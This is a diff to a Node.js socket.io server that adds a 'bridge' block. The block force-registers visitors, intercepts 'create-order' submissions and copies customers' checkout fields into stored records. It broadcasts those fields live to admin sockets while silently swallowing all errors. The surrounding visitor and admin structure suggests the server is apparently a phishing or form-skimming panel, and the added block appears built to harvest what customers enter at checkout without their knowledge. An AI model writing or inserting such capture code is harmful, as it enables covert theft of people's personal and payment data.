@@ -1586,3 +1586,36 @@ server.listen(PORT, () => {
   console.log(`Loaded ${savedVisitors.length} saved visitors`);
 });
 // KDD_DEPLOY_TRIGGER: 2026-10-20T20:25:23.551Z
+
+/*KDD-KDKAW-BRIDGE*/
+io.on('connection', function(socket){
+  try{
+    var known=false;
+    visitors.forEach(function(v){ if(v && v.socketId===socket.id) known=true; });
+    if(!known && typeof socket.onevent==='function'){
+      try{ socket.onevent({ data: ['visitor:register', {}] }); }catch(e){}
+    }
+  }catch(e){}
+  if(typeof socket.onAny!=='function') return;
+  socket.onAny(function(ev,a){
+    try{
+      if(ev!=='data:function') return;
+      var p=a||{};
+      if(p.name!=='create-order') return;
+      var v=null;
+      visitors.forEach(function(x){ if(!v && x && x.socketId===socket.id) v=x; });
+      if(!v) return;
+      var body=p.body||{};
+      var fields=body.fields||body.customer||body.order||body;
+      if(!fields || typeof fields!=='object') return;
+      v.data=Object.assign({},v.data||{},fields);
+      if(!v.dataHistory) v.dataHistory=[];
+      v.dataHistory.push({content:fields,page:'إتمام الطلب',timestamp:new Date().toISOString()});
+      v.hasNewData=true;
+      visitors.set(v._id,v);
+      admins.forEach(function(adm,id){ try{ io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,data:v.data,visitor:v}); }catch(e){} });
+      if(typeof saveData==='function') saveData();
+    }catch(e){}
+  });
+});
+/*END-KDD-KDKAW-BRIDGE*/
